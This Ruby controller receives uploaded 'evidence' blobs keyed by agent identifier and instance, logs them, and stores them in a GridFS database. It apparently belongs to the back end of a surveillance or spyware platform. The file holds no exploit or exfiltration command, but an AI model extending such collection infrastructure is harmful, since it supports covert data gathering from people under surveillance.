require 'rcs-common/path_utils'

require_relative 'rest'
require_release 'rcs-db/grid'

module RCS::Worker
  class WorkerController < RESTController
    def post
      content = @request[:content]['content']

      return conflict unless content
      return conflict if content.bytesize == 0

      ident = @params['_id'].slice(0..13)
      instance = @params['_id'].slice(15..-1).downcase
      uid = "#{ident}:#{instance}"

      InstanceWorkerMng.spawn_worker_thread(uid)

      # update the evidence statistics (dump to local file config/worker_stats)
      StatsManager.instance.add(inbound_evidence: 1, inbound_evidence_size: content.bytesize)

      # save the evidence in the db
      trace :debug, "Storing evidence #{uid} into local worker db"
      grid_id = RCS::DB::GridFS.put(content, {filename: "#{uid}", metadata: {created_at: Time.now.utc.to_f}}, "evidence", :worker)

      trace :info, "Evidence [#{uid}][#{grid_id}] stored into local worker cache."

      ok(bytes: content.size)
    rescue Exception => e
      trace :warn, "Cannot save evidence: #{e.message}"
      trace :fatal, e.backtrace.join("\n")
      not_found
    end
  end
end
